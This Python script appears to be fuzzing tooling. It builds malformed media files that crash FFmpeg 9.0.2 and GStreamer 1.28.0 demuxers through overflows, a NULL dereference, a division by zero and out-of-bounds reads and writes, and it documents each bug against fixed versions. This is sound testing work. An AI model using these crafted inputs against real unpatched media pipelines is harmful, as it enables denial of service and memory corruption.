#!/usr/bin/env python3
"""Cross-library crash seeds: FFmpeg vs GStreamer on the same bytes.

Diff direction: not a version diff inside one library (the 9.0.2 -> 9.1 pack
is ``gen_ffmpeg_91_seeds.py``, 8.0.3 the 803 pack) but FFmpeg's native
demuxer code against GStreamer's native demuxer code for the same container
construct. Every seed below sits on a spot where the two implementations
diverge, crashes one library (or both) and exits clean on the other --
verified by running each seed on gcc sanitizer harnesses of both libraries
(sandbox has no clang):

  ff902       ffmpeg 9.0.2  asan+ubsan
  ff902_fc    ffmpeg 9.0.2  + float-cast-overflow (flv/webm legs)
  ff91        ffmpeg 9.1    asan+ubsan  (fixed control)
  gst1280     gstreamer 1.28.0 asan
  gst1280_bz2 gstreamer 1.28.0 asan + instrumented libbz2 (bz2 seed)
  gst1289     gstreamer 1.28.9 asan  (fixed control)

seed                             ff902  ff902_fc  ff91   gst1280  gst1289
ff_caf_pakt_overflow.caf         UBSAN   UBSAN    clean   clean    clean
ff_rpl_idx_overflow.rpl          UBSAN   UBSAN    clean   clean    clean
ff_rf64_dataend_overflow.wav     UBSAN   UBSAN    clean   clean*   clean*
ff_flv_amf_nan_duration.flv      clean   UBSAN    clean   clean    clean
ff_webm_duration_cast.webm       clean   UBSAN    clean   clean    clean
ff_sbg_nan_cast.sbg              clean   clean    clean   clean    clean **
ff_wav_bext_bigalloc.wav         clean   clean    clean   clean    clean **
gs_wav_adtl_null_deref.wav       clean   clean    clean   SEGV     clean
gs_avi_vprp_zero_div.avi         clean   clean    clean   SIGFPE   clean*
gs_mkv_flac_priv_overread.mkv    clean   clean    clean   OOB-R    clean*
gs_mkv_bz2_avail_out_overflow.mkv clean   clean    clean   OOB-W†   clean*
gs_mkv_lzo_getlen_overflow.mkv   clean   clean    clean   OOB      clean*
dual_webm_duration_lzo.webm      clean   UBSAN    clean   SEGV     clean*

* LSan reports leaks at exit on 1.28.9 for these inputs; the harness prints
  "clean exit" first -- not a crash.
** 91-pack documented claims (sbg: clang-only float-cast; bext: OOM probe);
  see ``gen_ffmpeg_91_seeds.py``.
† plain gst1280 build: the overflow happens inside uninstrumented libbz2.

ff_  imported from the 91 pack; cross-verified against GStreamer here.
  caf/rpl  No GStreamer demuxer exists: CAF type-finds to audio/x-caf
           (gsttypefindfunctionsstartwith.c:142) but nothing sinks that
           caps, and RPL/ARMovie is not typefound at all -- the harness's
           byte0%5 fallback picks an unrelated demuxer -> clean.
  rf64     parser-vs-parser: 9.0.2 computes next_tag_ofs = data_end +
           (data_size & 1) on a saturated data_end -> signed int64 overflow
           (wavdec.c:459; 9.1 wraps it in av_sat_add64). wavparse keeps
           datasize/end_offset guint64 and clamps the size to the upstream
           length via MIN() (gstwavparse.c:1416-1421): no signed store
           exists to overflow.
  flv      9.0.2 stores the AMF double into signed int64:
           s->duration = num_val * AV_TIME_BASE (flvdec.c:721; 9.1
           range-guards it). flvdemux computes d * GST_SECOND in double
           and stores into unsigned GstClockTime (gstflvdemux.c:482) --
           clang's float-cast-overflow does not instrument unsigned
           destinations, so the same NaN that traps FFmpeg is inert there.
  webm     9.0.2: ctx->duration = duration * time_scale * 1000 /
           AV_TIME_BASE behind an isnan-only guard (matroskadec.c:3493;
           9.1 adds an INT64_MAX range check). GStreamer casts
           dur_f * time_scale through gst_gdouble_to_guint64 and gates
           dur_u <= G_MAXINT64 (matroska-read-common.c:2109-2116).
  sbg/bext no SBG typefind in GStreamer; wavparse skips unknown LIST
           subchunks via gst_waveparse_ignore_chunk (gstwavparse.c:1647).

gs_  GStreamer 1.28.0 crashes; FFmpeg 9.0.2 AND 9.1 parse the same bytes
     clean -- the divergence is between the two libraries, not two releases.
  mkv lzo  the vendored-copy divergence: gst matroska ships a copy of
           FFmpeg's lzo.c. FFmpeg's get_len has carried the
           `cnt >= INT_MAX - 1000` wrap guard since 2014
           (libavutil/lzo.c:72); 1.28.0's copy still had the bare
           `cnt += 255` loop (lzo.c:70-72). A 9 MB zero length-run wraps
           cnt negative, copy()'s clamps skip negatives, memcpy gets a
           huge size. 1.28.9 re-ported FFmpeg's guard (MR 12079).
  mkv bz2  both decode bz2 ContentCompression; FFmpeg computes the true
           remaining space, avail_out = pkt_size - bzstream.total_out_lo32
           (matroskadec.c:1791). 1.28.0's grow loop mis-parenthesized the
           same computation into new_size - hi32<<32 + lo32 ==
           new_size + total_out, so the second BZ2_bzDecompress pass
           writes past the grown buffer.
  mkv flac FFmpeg's matroska_parse_flac requires size >= 8 + 34 (STREAMINFO)
           and clamps codec_priv to exactly that before its single memcpy
           (matroskadec.c:2151-2165). 1.28.0 checked
           off + len > codec_data_size but copied len + 4: a block length
           reaching exactly the CodecPrivate end overreads 4 bytes.
  avi vprp FFmpeg's vprp case consumes a fixed 36-byte prefix and skips the
           rest (avidec.c:1005-1031); 1.28.0 iterated field_info[] dividing
           by the chunk-declared field count (gstavidemux.c:1811) --
           fields == 0 is a SIGFPE. 1.28.9 zero-guards and divides by
           sizeof(field_info[0]) instead.
  wav adtl FFmpeg reads adtl only as bounded labl strings via avio_get_str
           into a 512-byte buffer, gated on chapters existing
           (wavdec.c:542-567). 1.28.0's push-mode adtl branch mapped
           size - 4 bytes from the adapter without a NULL check: a
           LIST/adtl whose declared body never arrives dereferences NULL
           (gstwavparse.c:937).

dual_  one file, both libraries, two independent bugs: Segment Duration
  1e18 (FFmpeg 9.0.2 float-cast overflow: 1e18 * 1e6 * 1000 / 1e6 = 1e21)
  plus the LZO zero-run on the same track (GStreamer 1.28.0 lzo wrap).

Usage:
    python tools/gen_ffmpeg_gst_seeds.py [--target ffmpeg|gstreamer|both]
                                         [--out DIR]

Output is written to <out>/seeds/ (the layout load_corpus reads); --out
defaults to ~/fuzzing/crash_seeds. Offline; not wired into ``fuzz``.
"""

from __future__ import annotations

import argparse
import bz2
import os
import random
import struct
import sys
import tempfile
from pathlib import Path

# Make the `tools` namespace package importable when run as a script
# (cwd-independent), matching how the test suite imports it under pytest.
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

# FFmpeg seeds come from the 9.1 pack -- single source of truth, no drift.
from tools.gen_ffmpeg_91_seeds import SEEDS as FFMPEG_SEEDS  # noqa: E402
from tools.gen_ffmpeg_91_seeds import be24, le16, le32  # noqa: E402

DEFAULT_OUT = os.path.expanduser("~/fuzzing/crash_seeds")

# Library versions the verdict matrix was measured on.
FFMPEG_VULN_VERSION = "9.0.2"
FFMPEG_FIXED_VERSION = "9.1"
GST_VULN_VERSION = "1.28.0"
GST_FIXED_VERSION = "1.28.9"

# gstreamer_read.c pushes input in 4096-byte buffers and avidemux's chain
# advances one state machine step per push: pad past two pushes so the
# HEADER state (where strl/vprp is parsed) actually runs.
GST_HARNESS_CHUNK = 4096
AVI_PAD = 2 * GST_HARNESS_CHUNK + 1024

# get_len wraps int32 once the zero-run passes 2**31/255 bytes; 9M leaves
# comfortable margin and keeps the wrapped count far from -3 (which would
# make `cnt + 3` non-negative again).
INT32_MAX = 0x7FFFFFFF
LZO_ZERO_RUN = 9_000_000

# The bz2 seed needs decompressed > compressed (so the first pass ends
# output-full with input left, iterating the buggy grow loop) and enough
# total data to write past the grown buffer on the second pass.
BZ2_RAW_SIZE = 24576
BZ2_ENTROPY_ALPHABET = 4
BZ2_RNG_SEED = 20261126

# 4-byte FLAC metadata block header + 34-byte STREAMINFO-sized payload:
# the minimum gst_matroska_parse_flac_stream_headers accepts. Declaring 4
# bytes more than the payload holds slips past the 1.28.0
# `off + len > codec_data_size` check while memdup reads len + 4.
FLAC_STREAMINFO_SIZE = 34
FLAC_OVERREAD = 4

# 1.28.0 wavparse flushes the 12-byte "LIST"+size+"adtl" header and maps
# `size - 4` bytes; a size of 12 declares 8 body bytes that never arrive.
WAV_ADTL_LIST_SIZE = 12

# Matroska ContentCompression algorithms (matroska-ids.h).
COMP_ALGO_BZ2 = 1
COMP_ALGO_LZO = 2

# 1e18 * 1e6 (default time scale) * 1000 / 1e6 = 1e21: finite in double
# but past INT64_MAX, so 9.0.2's isnan-only guard misses it.
WEBM_DURATION = 1e18

MATROSKA_TRACK_TYPE_AUDIO = 2

# Matroska element ids (gst-plugins-good gst/matroska/matroska-ids.h),
# kept as bytes to stay close to the wire format.
ID_SEGMENT = b"\x18\x53\x80\x67"
ID_INFO = b"\x15\x49\xa9\x66"
ID_TIMECODESCALE = b"\x2a\xd7\xb1"
ID_DURATION = b"\x44\x89"
ID_TRACKS = b"\x16\x54\xae\x6b"
ID_TRACKENTRY = b"\xae"
ID_TRACKNUMBER = b"\xd7"
ID_TRACKTYPE = b"\x83"
ID_CODECID = b"\x86"
ID_CODECPRIVATE = b"\x63\xa2"
ID_AUDIO = b"\xe1"
ID_CHANNELS = b"\x9f"
ID_SAMPLINGFREQ = b"\xb5"
ID_CONTENTENCODINGS = b"\x6d\x80"
ID_CONTENTENCODING = b"\x62\x40"
ID_CONTENTENCODINGSCOPE = b"\x50\x32"
ID_CONTENTCOMPRESSION = b"\x50\x34"
ID_CONTENTCOMPALGO = b"\x42\x54"
ID_CLUSTER = b"\x1f\x43\xb6\x75"
ID_TIMECODE = b"\xe7"
ID_SIMPLEBLOCK = b"\xa3"


# -- EBML helpers ---------------------------------------------------
def ebml_size(n):
    """Minimal-length EBML size vint: L-1 leading zero bits, then a 1 bit."""
    length = 1
    while n >= (1 << (7 * length)) - 1 and length < 8:
        length += 1
    first = (0x80 >> (length - 1)) | (n >> (8 * (length - 1)))
    rest = bytes((n >> (8 * i)) & 0xFF for i in range(length - 2, -1, -1))
    return bytes([first]) + rest


def ebml_el(eid, payload):
    return eid + ebml_size(len(payload)) + payload


def ebml_uint(eid, v):
    n = 1
    while v >= (1 << (8 * n)):
        n += 1
    return ebml_el(eid, v.to_bytes(n, "big"))


def ebml_float(eid, d):
    return ebml_el(eid, struct.pack(">d", d))


def ebml_str(eid, s):
    return ebml_el(eid, s.encode())


def ebml_header(doctype):
    h = ebml_uint(b"\x42\x86", 1)  # EBMLVersion
    h += ebml_uint(b"\x42\xf7", 1)  # EBMLReadVersion
    h += ebml_uint(b"\x42\xf2", 4)  # EBMLMaxIDLength
    h += ebml_uint(b"\x42\xf3", 8)  # EBMLMaxSizeLength
    h += ebml_str(b"\x42\x82", doctype)  # DocType
    h += ebml_uint(b"\x42\x87", 2)  # DocTypeVersion
    h += ebml_uint(b"\x42\x85", 2)  # DocTypeReadVersion
    return ebml_el(b"\x1a\x45\xdf\xa3", h)


def track_entry(codec_id, codec_priv=None, comp_algo=None):
    """Minimal audio TrackEntry; ContentEncoding when comp_algo is given."""
    te = ebml_uint(ID_TRACKNUMBER, 1)
    te += ebml_uint(ID_TRACKTYPE, MATROSKA_TRACK_TYPE_AUDIO)
    te += ebml_str(ID_CODECID, codec_id)
    if codec_priv is not None:
        te += ebml_el(ID_CODECPRIVATE, codec_priv)
    if comp_algo is not None:
        comp = ebml_uint(ID_CONTENTCOMPALGO, comp_algo)
        enc = ebml_uint(ID_CONTENTENCODINGSCOPE, 1)
        enc += ebml_el(ID_CONTENTCOMPRESSION, comp)
        te += ebml_el(ID_CONTENTENCODINGS, ebml_el(ID_CONTENTENCODING, enc))
    # SamplingFrequency is a float element; an integer there fails track parse.
    audio = ebml_float(ID_SAMPLINGFREQ, 44100.0) + ebml_uint(ID_CHANNELS, 1)
    return ebml_el(ID_TRACKENTRY, te + ebml_el(ID_AUDIO, audio))


def simple_block(payload):
    # track vint 0x81 (track 1), int16 timecode 0, flags 0: keyframe, no lacing
    return ebml_el(ID_SIMPLEBLOCK, b"\x81\x00\x00\x00" + payload)


def matroska_file(tracks, blocks, info_extra=b"", doctype="matroska"):
    info = ebml_uint(ID_TIMECODESCALE, 1000000) + info_extra
    seg = ebml_el(ID_INFO, info) + ebml_el(ID_TRACKS, tracks)
    if blocks:
        cluster = ebml_el(ID_TIMECODE, struct.pack(">h", 0)) + b"".join(blocks)
        seg += ebml_el(ID_CLUSTER, cluster)
    return ebml_header(doctype) + ebml_el(ID_SEGMENT, seg)


def lzo_zero_run_payload():
    """LZO stream whose first length run overflows get_len's int counter."""
    return b"\x00" * LZO_ZERO_RUN + b"\x01"


# -- GStreamer 1.28.0 seed builders ---------------------------------
def gst_wav_adtl_null_deref():
    """LIST/adtl with a declared-but-absent body -> NULL deref (1.28.0)."""
    fmt = le16(1) + le16(1) + le32(44100) + le32(88200) + le16(2) + le16(16)
    payload = b"WAVE" + b"fmt " + le32(len(fmt)) + fmt
    payload += b"LIST" + le32(WAV_ADTL_LIST_SIZE) + b"adtl"  # body never arrives
    return b"RIFF" + le32(len(payload)) + payload


def gst_avi_vprp_zero_div():
    """vprp chunk with fields=0 -> integer division by zero (1.28.0)."""

    def chunk(fourcc, data):
        return fourcc.encode() + le32(len(data)) + data

    # MainAVIHeader: 10 uint32 + 4 int32 reserved.
    avih = struct.pack("<10I", 10000, 0, 0, 0, 1, 0, 1, 0, 320, 240)
    avih += struct.pack("<4i", 0, 0, 0, 0)

    # AVISTREAMHEADER: fcc, handler, flags, priority, language,
    # initialFrames, scale, rate, start, length, suggestedBuf, quality,
    # sampleSize, rcFrame.
    strh = b"vids" + b"    " + struct.pack("<IHHIIIIIIII", 0, 0, 0, 0, 1, 25, 0, 1, 0, 0, 0)
    strh += struct.pack("<4h", 0, 0, 160, 120)

    # BITMAPINFOHEADER.
    strf = struct.pack("<IiiHHIIiiII", 40, 320, 240, 1, 24, 0, 320 * 240 * 3, 0, 0, 0, 0)

    # Exactly offsetof(gst_riff_vprp, field_info) == 36 bytes: the size
    # check passes and the division runs with fields == 0.
    vprp = struct.pack("<8I", 0, 0, 0, 0, 0, 0, 320, 240) + le32(0)

    strl = chunk("LIST", b"strl" + chunk("strh", strh) + chunk("strf", strf) + chunk("vprp", vprp))
    hdrl = chunk("LIST", b"hdrl" + chunk("avih", avih) + strl)
    # Push-mode avidemux needs the movi list to close the header phase, and
    # the padding so the harness's chunked pushes advance it there.
    body = b"AVI " + hdrl + chunk("LIST", b"movi") + b"\x00" * AVI_PAD
    return b"RIFF" + le32(len(body)) + body


def gst_mkv_flac_priv_overread():
    """FLAC CodecPrivate block length at the exact end -> 4-byte OOB read."""
    # STREAMINFO block header declaring len 38 = payload(34) + 4: the
    # 1.28.0 check `4 + 38 > 42` is false, memdup(38 + 4) reads to 46.
    priv = b"fLaC" + b"\x00" + be24(FLAC_STREAMINFO_SIZE + FLAC_OVERREAD)
    priv += b"\x00" * FLAC_STREAMINFO_SIZE
    return matroska_file(track_entry("A_FLAC", priv), [])


def gst_mkv_bz2_avail_out_overflow():
    """bzip2 track whose decompression iterates the bugged grow loop."""
    # Semi-compressible data: ~24.5KB output from ~6.8KB input, so the
    # first pass ends output-full with input remaining and the second pass
    # writes past the buffer the oversized avail_out lets it.
    rng = random.Random(BZ2_RNG_SEED)
    raw = bytes(rng.randrange(BZ2_ENTROPY_ALPHABET) for _ in range(BZ2_RAW_SIZE))
    return matroska_file(
        track_entry("A_PCM/INT/LIT", None, comp_algo=COMP_ALGO_BZ2),
        [simple_block(bz2.compress(raw, 9))],
    )


def gst_mkv_lzo_getlen_overflow():
    """LZO track: 9M zero bytes wrap get_len's count into memcpy (1.28.0)."""
    return matroska_file(
        track_entry("A_PCM/INT/LIT", None, comp_algo=COMP_ALGO_LZO),
        [simple_block(lzo_zero_run_payload())],
    )


# -- dual-target seed builder ---------------------------------------
def dual_webm_duration_lzo():
    """Segment Duration 1e18 (FFmpeg 9.0.2) + LZO wrap (GStreamer 1.28.0)."""
    return matroska_file(
        track_entry("A_PCM/INT/LIT", None, comp_algo=COMP_ALGO_LZO),
        [simple_block(lzo_zero_run_payload())],
        info_extra=ebml_float(ID_DURATION, WEBM_DURATION),
        doctype="webm",
    )


GSTREAMER_SEEDS = {
    "wav_adtl_null_deref.wav": gst_wav_adtl_null_deref,
    "avi_vprp_zero_div.avi": gst_avi_vprp_zero_div,
    "mkv_flac_priv_overread.mkv": gst_mkv_flac_priv_overread,
    "mkv_bz2_avail_out_overflow.mkv": gst_mkv_bz2_avail_out_overflow,
    "mkv_lzo_getlen_overflow.mkv": gst_mkv_lzo_getlen_overflow,
}

DUAL_SEEDS = {
    "webm_duration_lzo.webm": dual_webm_duration_lzo,
}


def write_seeds(seeds_dir, seeds_dict, prefix=""):
    """Atomically publish ``seeds_dict`` into ``seeds_dir`` with ``prefix``.

    Each seed is staged in the *parent* directory (outside the scanned
    ``seeds/`` tree) via an exclusive, random temp name, then renamed into
    place, so load_corpus never sees a partial file and a planted temp-name
    symlink cannot redirect the write.
    """
    stage_dir = os.path.dirname(os.path.abspath(seeds_dir))

    for name, build in seeds_dict.items():
        data = build()
        fd, tmp = tempfile.mkstemp(dir=stage_dir, prefix=f".{prefix}{name}.", suffix=".part")

        try:
            with os.fdopen(fd, "wb") as f:
                f.write(data)
            os.replace(tmp, os.path.join(seeds_dir, prefix + name))
        finally:
            if os.path.exists(tmp):
                os.unlink(tmp)

        print(f"{prefix}{name}: {len(data)}B")


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument(
        "--out",
        default=DEFAULT_OUT,
        help="pack root; seeds are written to <out>/seeds/ (default: %(default)s)",
    )
    ap.add_argument(
        "--target",
        choices=["ffmpeg", "gstreamer", "both"],
        default="both",
        help="which fuzz target to generate seeds for (default: both)",
    )
    args = ap.parse_args()

    out = os.path.join(args.out, "seeds")
    os.makedirs(out, exist_ok=True)

    if args.target in ("ffmpeg", "both"):
        write_seeds(out, FFMPEG_SEEDS, prefix="ff_")
    if args.target in ("gstreamer", "both"):
        write_seeds(out, GSTREAMER_SEEDS, prefix="gs_")
    if args.target == "both":
        write_seeds(out, DUAL_SEEDS, prefix="dual_")

    print("seeds dir:", out)


if __name__ == "__main__":
    main()
